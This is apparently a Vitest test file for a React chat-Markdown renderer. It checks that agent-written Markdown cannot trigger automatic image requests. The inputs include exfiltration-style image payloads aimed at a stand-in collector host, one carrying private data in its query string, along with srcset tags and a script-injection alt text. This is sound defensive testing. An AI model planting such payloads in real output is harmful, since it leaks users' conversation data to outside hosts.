import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { AgentChatMarkdown } from './agent-chat-markdown';

describe('untrusted agent Markdown media', () => {
  it.each([
    '![Source](https://collector.example/collect?message=private-question)',
    '![Source](http://127.0.0.1/private)',
    '![Source](//collector.example/track)',
    '![Source](/uploads/pixel.png)',
    '![Source](data:image/png;base64,aGVsbG8=)',
    '<img src="https://collector.example/pixel" srcset="https://collector.example/other 2x">',
  ])('cannot emit an automatic image request from %s', (content) => {
    const html = renderToStaticMarkup(createElement(AgentChatMarkdown, { content }));
    expect(html).not.toMatch(/<(?:img|source|picture)\b|<[^>]+\bsrcset=|rel="preload"/i);
    expect(html).not.toMatch(/\bsrc="/i);
  });

  it('preserves escaped text alternatives and normal explicit links', () => {
    const html = renderToStaticMarkup(createElement(AgentChatMarkdown, {
      content: '![<script>sample</script>](https://collector.example/pixel) [Read source](https://example.com/source)',
    }));
    expect(html).toContain('&lt;script&gt;sample&lt;/script&gt;');
    expect(html).not.toContain('<script>');
    expect(html).toContain('href="https://example.com/source"');
    expect(html).not.toContain('collector.example');
  });
});
